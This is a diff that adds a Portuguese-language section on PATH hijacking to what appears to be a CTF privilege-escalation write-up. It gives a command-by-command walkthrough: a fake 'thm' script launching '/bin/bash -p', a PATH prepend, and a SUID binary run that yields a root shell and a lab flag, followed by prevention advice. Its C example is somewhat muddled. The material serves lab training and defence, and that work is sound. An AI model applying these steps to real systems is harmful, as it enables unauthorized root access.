@@ -911,3 +911,367 @@ matt:123456
 8. **Pós-exploração**: Capturar flag (`THM-383000283`) e coletar hash do usuário matt para quebra
 
 ---
+## 8. PATH Hijacking
+
+### O que é a variável PATH?
+
+O **PATH** é uma variável de ambiente fundamental no Linux que define os diretórios onde o sistema procura por programas executáveis quando um comando é digitado sem um caminho completo (absoluto). Quando você digita `ls`, `cat` ou `python`, o sistema verifica **cada diretório listado no PATH, em ordem**, até encontrar um arquivo executável com esse nome.
+
+```bash
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+```
+
+**Entendendo o PATH:**
+
+- Os diretórios são separados por `:` (dois pontos)
+- A **ordem importa**: o sistema procura no primeiro diretório, depois no segundo, etc.
+- Ao encontrar o primeiro executável com o nome buscado, ele é executado imediatamente
+- Se não encontrar em nenhum, retorna "comando não encontrado"
+
+### O que é PATH Hijacking?
+
+PATH Hijacking (ou sequestro de PATH) é uma técnica onde um atacante manipula a ordem de busca de executáveis para fazer um programa privilegiado executar um código malicioso em vez do programa legítimo.
+
+**Analogia simples:** Imagine que você pede para alguém "trazer uma caixa" sem especificar onde. Se eu colocar uma caixa suspeita mais perto, essa será trazida primeiro. O PATH Hijacking faz exatamente isso: coloca um "programa falso" em um local que será verificado antes do local legítimo.
+
+### Como o Ataque Funciona na Prática
+
+Quando um programa com privilégios elevados (como um binário SUID root) executa outro programa **sem usar o caminho absoluto** (ex: `system("ls")` em vez de `system("/bin/ls")`), ele segue a ordem do PATH. Se conseguirmos fazer nosso programa malicioso ser encontrado **antes** do legítimo, ele será executado com todos os privilégios do programa chamador.
+
+**Condições necessárias para o ataque:**
+
+1. **Um binário SUID ou script executado com privilégios** que chama programas sem caminho absoluto
+2. **Capacidade de escrever** em algum diretório que será verificado antes do diretório legítimo
+3. **Capacidade de executar** o binário vulnerável
+
+### Método 1: Explorando Diretórios Graváveis no PATH
+
+```bash
+echo $PATH | tr ':' '\n'
+/usr/local/sbin
+/usr/local/bin
+/usr/sbin
+/usr/bin
+/sbin
+/bin
+```
+
+#### Passo 2: Verificar permissões de escrita
+
+```bash
+# Verifica permissões de cada diretório no PATH
+for dir in $(echo $PATH | tr ':' ' '); do
+    ls -ld $dir 2>/dev/null
+done
+```
+
+**O que procurar:** Diretórios onde você tem permissão de escrita (`w` no grupo "outros" ou sendo dono do diretório).
+
+**Nota importante:** Em sistemas bem configurados, diretórios como `/bin` e `/usr/bin` NÃO são graváveis por usuários comuns. Esta técnica funciona melhor em CTFs ou sistemas mal configurados.
+
+### Método 2: Adicionando um Diretório Gravável ao PATH (Mais Comum)
+
+Como diretórios do sistema raramente são graváveis, a abordagem mais comum é **adicionar um diretório que CONTROLAMOS ao início do PATH**.
+
+#### Passo 1: Encontrar diretórios graváveis
+
+```bash
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+
+Diretórios comuns graváveis:
+
+- `/tmp` (temporário, quase sempre gravável)
+- `/dev/shm` (memória compartilhada)
+- `/var/tmp` (temporário persistente)
+- Diretórios home com permissões frouxas
+
+#### Passo 2: Modificar o PATH para incluir o diretório controlado
+
+```bash
+export PATH=/tmp:$PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+**Explicação:** Isso coloca `/tmp` como o PRIMEIRO local onde o sistema procurará por executáveis.
+
+### Cenário Prático Completo (Passo a Passo)
+
+Vamos explorar um cenário real onde encontramos um binário SUID vulnerável.
+
+#### 1. Encontrando o Binário Vulnerável
+
+```bash
+# Procura por arquivos SUID (com permissão especial)
+find / -perm -4000 2>/dev/null
+```
+
+Este comando procura por **arquivos com o bit SUID ativado** em todo o sistema. O bit SUID é uma permissão especial que faz com que um programa seja executado com os privilégios do **dono do arquivo** (geralmente root), em vez dos privilégios do usuário que o executou.
+
+No nosso exemplo econtramo um programa interessante: `/home/murdoch/test`
+
+#### 2. Analisando o Programa
+
+```bash
+cd /home/murdoch
+ls -la
+```
+
+```text
+total 32
+drwxrwxrwx 2 root root  4096 Oct 22  2021 .
+drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
+-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
+-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
+```
+
+**Análise das permissões:**
+
+- `rwsr-xr-x` = O 's' indica SUID ativo
+- Dono: root → Quando executado, roda como root
+- Grupo: root
+- Nós (usuário comum) podemos executar
+
+#### 3. Entendendo o que o Programa Faz
+
+Vamos verificar o que o programa executa:
+
+```bash
+strings test | grep -E "system|exec|popen"
+```
+
+Ou analisando o script Python relacionado:
+
+```bash
+cat thm.py
+```
+
+```python
+#!/usr/bin/python3
+import os
+import sys
+
+try: 
+    os.system("thm")  # PERIGO! Chama "thm" sem caminho absoluto
+except:
+    sys.exit()
+```
+
+**Identificamos a vulnerabilidade:** O programa tenta executar um comando chamado `thm`, mas **não especifica onde ele está** (sem caminho absoluto).
+
+#### 4. Testando a Vulnerabilidade
+
+```bash
+./test
+```
+
+```text
+sh: 1: thm: not found
+```
+
+**Interpretação:** O sistema procurou `thm` em todos os diretórios do PATH e não encontrou. Perfeito para nosso ataque!
+
+#### 5. Criando o Executável Malicioso
+
+```bash
+# Vamos usar o diretório atual, que é gravável
+echo "/bin/bash" > thm
+chmod +x thm
+ls -l thm
+```
+
+```text
+-rwxrwxr-x 1 murdoch murdoch 10 Jun 17 14:36 thm
+```
+
+**O que fizemos:**
+
+- Criamos um script chamado `thm` com o conteúdo `/bin/bash`
+- Damos permissão de execução (`chmod +x`)
+- O script simplesmente inicia um shell bash
+
+#### 6. Manipulando o PATH
+
+```bash
+# Adiciona nosso diretório ao início do PATH
+export PATH=/home/murdoch:$PATH
+
+# Verifica se funcionou
+echo $PATH
+/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+**Agora:** Quando qualquer programa procurar por `thm`, o sistema vai olhar PRIMEIRO em `/home/murdoch`, onde está nosso script malicioso.
+
+#### 7. Executando o Ataque
+
+```bash
+./test
+```
+
+```bash
+# Verificamos se funcionou
+whoami
+root
+
+id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+```
+
+**SUCESSO!** Temos shell root!
+
+#### 8. O que Aconteceu nos Bastidores:
+
+1. Executamos `./test` (programa SUID root)
+2. O programa chamou `system("thm")`
+3. O sistema consultou o PATH: `/home/murdoch` (1º)
+4. Encontrou nosso script `thm` em `/home/murdoch`
+5. Executou nosso script **com privilégios de root**
+6. Nosso script executou `/bin/bash` como root
+
+#### 9. Encontrando a Flag
+
+```bash
+# Procura por arquivos com "flag" no nome (melhorado)
+find / -type f -name "*flag*" 2>/dev/null | while read file; do
+    echo "Arquivo encontrado: $file"
+    ls -la "$file" 2>/dev/null
+done
+```
+
+**Explicando o comando:**
+
+- `-type f`: busca apenas arquivos (não diretórios)
+- `-name "*flag*"`: qualquer arquivo com "flag" no nome
+- `while read file`: processa cada resultado
+- Exibe permissões e localização
+
+**Resultado:**
+
+```text
+Arquivo encontrado: /home/matt/flag6.txt
+-rw-r--r-- 1 root root 15 Jun 20  2021 /home/matt/flag6.txt
+```
+
+```bash
+cat /home/matt/flag6.txt
+THM-736628929
+```
+
+### Checklist Prático para Exploração
+
+Quando encontrar um binário SUID, siga este checklist:
+
+1. **Identifique o que o binário executa:**
+
+```bash
+strings /caminho/do/binario | grep -E "system|exec|popen"
+```
+
+2. **Liste os diretórios no PATH atual:**
+
+```bash
+echo $PATH | tr ':' '\n'
+```
+
+3. **Encontre diretórios graváveis:**
+
+```bash
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+
+4. **Crie o executável malicioso:**
+
+```bash
+echo '#!/bin/bash' > /tmp/thm
+echo '/bin/bash -p' >> /tmp/thm  # -p preserva privilégios
+chmod +x /tmp/thm
+```
+
+5. **Modifique o PATH:**
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+6. **Execute o binário vulnerável:**
+
+```bash
+/caminho/do/binario
+```
+
+### Variações do Ataque
+
+#### Comandos com Argumentos
+
+Se o programa chama algo como `system("thm -a -b")`, nosso script ainda funciona, mas podemos capturar argumentos:
+
+```bash
+echo '#!/bin/bash' > /tmp/thm
+echo '/bin/bash -p' >> /tmp/thm
+```
+
+#### Usando Outras Linguagens
+
+Podemos criar o executável malicioso em C para mais discrição:
+
+```c
+// thm.c
+#include <unistd.h>
+#include <stdlib.h>
+void main() {
+    setuid(0);
+    setgid(0);
+    system("thm");
+}
+```
+
+```bash
+gcc thm.c -o thm -w
+```
+
+### Prevenção (Para Administradores)
+
+Para proteger sistemas contra PATH Hijacking:
+
+1. **Use caminhos absolutos SEMPRE:**
+
+```c
+// ERRADO
+system("ls");
+
+// CORRETO
+system("/bin/ls");
+```
+
+2. **Defina PATH seguro em scripts:**
+
+```bash
+# No início de scripts, defina um PATH restrito
+PATH="/usr/local/bin:/usr/bin:/bin"
+export PATH
+```
+
+3. **Evite SUID em scripts:** Scripts com SUID são inerentemente perigosos
+
+4. **Audite binários SUID regularmente:**
+
+```bash
+find / -perm -4000 -ls 2>/dev/null
+```
+
+5. **Remova SUID desnecessário:**
+
+```bash
+sudo chmod u-s /caminho/do/binario
+```
+
+### Resumo da Exploração
+
+PATH Hijacking é uma técnica poderosa que explora a confiança cega no PATH e o uso de caminhos relativos. Em sistemas bem configurados, é mais difícil de explorar diretamente, mas em CTFs e ambientes de teste, é uma das maneiras mais rápidas de escalar privilégios quando se encontra um binário SUID que executa comandos sem caminhos absolutos.
+
+**Lembre-se:** Esta técnica funciona porque o sistema confia na ordem do PATH. Como atacante, você está apenas "ajudando" o sistema a encontrar um executável "mais conveniente" primeiro!
+
+---
